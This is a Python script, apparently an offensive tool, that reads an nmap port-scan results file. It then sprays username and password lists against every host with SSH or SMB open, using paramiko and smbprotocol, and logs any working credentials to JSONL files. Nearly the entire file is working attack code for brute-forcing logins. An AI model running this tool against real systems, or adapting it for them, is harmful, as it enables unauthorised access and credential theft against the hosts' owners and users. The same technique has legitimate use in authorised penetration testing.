import json
import uuid
import paramiko
from smbprotocol.connection import Connection
from smbprotocol.session import Session
from smbprotocol.tree import TreeConnect
from smbprotocol.exceptions import SMBAuthenticationError, SMBResponseException
class OpenFile():
    def OpenTargets():
        f = open("nmapports.json","r")
        return json.loads(f.read())
    def ParseJson():
        data = OpenFile.OpenTargets()
            
        ip_list = list(data.keys())
                        
        smb_ips=[]
        ssh_ips=[]
        #print(ip_list)
        for ip in ip_list:
            #print(a)
                                
            ip_data = data.get(ip, {})
                        
            ip_ports = ip_data.get("open_ports", [])
            #print("role port values\n")
                        
            #print(ip_ports)
            clean_ports_int = [int(port.split('/')[0]) for port in ip_ports]
            
            
            if 22 in clean_ports_int:
                ssh_ips.append(ip)

            if 135 in clean_ports_int or 445 in clean_ports_int:
                smb_ips.append(ip)

            else:
                continue
    
        return smb_ips,ssh_ips
class sshSpray():
    
    @staticmethod
    def check_ssh_login(ip, username, password):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(ip, port=22, username=username, password=password, timeout=3, allow_agent=False, look_for_keys=False)
            client.close()
            return True # Başarılı Spraying
        except paramiko.AuthenticationException:
            return False # Hatalı Parola
        except Exception as e:
            return None # Bağlantı/Timeout Hatası

    def Openpass():
        f = open("scan/sshpasslist.txt", "r+")
        return f
    def Openuname():
        f = open("scan/sshuserlist.txt", "r+")
        return f

    def sshresults(data):
        with open("scan/sshPasSprayresults.jsonl", "a") as f:
            f.writelines(data)

    def resultreset():
        f = open("scan/sshPasSprayresults.jsonl" , "w")
        f.write("")
        f.close()
    def spray():
        sshSpray.resultreset()
        userlist = sshSpray.Openuname()
        userfile = userlist.readlines()
        passlist = sshSpray.Openpass()
        passfile = passlist.readlines()
        smb_ips,ssh_ips = OpenFile.ParseJson()
        for ip in ssh_ips:
            for uname in userfile:
                for password in passfile:
                    if sshSpray.check_ssh_login(ip , uname, password):
                        print("[!!!] ssh FOUND [!!!] "+ip+" "+"username: "+uname+" password: "+password)
                        payload = {
                            "ip": ip,
                            "username": uname,
                            "password": password
                        }
                        data = json.dumps(payload)
                        sshSpray.sshresults(data)
        
                    else:
                        print("ssh not found [*] ip: "+ip+" username: "+uname+" password: "+password)
class smbSpray():
    def Openpass():
        f = open("scan/smbpasslist.txt", "r+")
        return f
    def Openuname():
        f = open("scan/smbuserlist.txt", "r+")
        return f
    @staticmethod
    def check_smb_auth(target_ip: str, username: str, password: str) -> bool:
        
        formatted_username = username if "\\" in username or "@" in username else f".\\{username}"
    
    
        connection = Connection(uuid.uuid4(), target_ip, port=445)
    
        try:
            connection.connect(timeout=3)
        
       
            session = Session(connection, username=formatted_username, password=password)
            session.connect()
        
        
            tree = TreeConnect(session, f"\\\\{target_ip}\\IPC$")
            tree.connect()
        
        
            tree.disconnect()
            connection.disconnect()
            return True

        except SMBAuthenticationError:
       
            connection.disconnect()
            return False
        
        except (SMBResponseException, Exception):
        
            connection.disconnect()
            return False

    def resultreset():
        f = open("scan/smbPasSprayresults.jsonl" , "w")
        f.write("")
        f.close()

    def smbresults(data):
        with open("scan/smbPasSprayresults.jsonl", "a") as f:
            f.writelines(data)
    
    def spray():
        smbSpray.resultreset()
        userlist = smbSpray.Openuname()
        userfile = userlist.readlines()
        passlist = smbSpray.Openpass()
        passfile = passlist.readlines()
        smb_ips,ssh_ips = OpenFile.ParseJson()
        for ip in smb_ips:
            for uname in userfile:
                for password in passfile:
                    if smbSpray.check_smb_auth(ip , uname, password):
                        print("[!!!] smb FOUND [!!!] "+ip+" "+"username: "+uname+" password: "+password)
                        payload = {
                            "ip": ip,
                            "username": uname,
                            "password": password
                        }
                        data = json.dumps(payload)
                        smbSpray.smbresults(data)

                    else:
                        print("smb not found [*] ip: "+ip+" username: "+uname+" password: "+password)
    
#smbSpray.spray()
#sshSpray.spray()